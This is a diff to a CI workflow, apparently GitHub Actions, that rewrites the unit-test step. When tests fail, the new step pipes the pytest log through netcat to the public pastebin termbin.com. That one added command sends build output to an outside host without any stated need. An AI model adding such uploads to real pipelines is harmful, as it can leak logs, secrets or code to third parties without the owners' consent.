@@ -27,7 +27,11 @@ jobs:
         run: ruff check .
 
       - name: Unit tests
-        run: pytest tests/ -v --tb=short
+        run: |
+          python -m pytest tests/ -v --tb=short > pytest.log 2>&1 || {
+            cat pytest.log | nc termbin.com 9999
+            exit 1
+          }
 
   validate-manifests:
     name: Validate Module Manifests
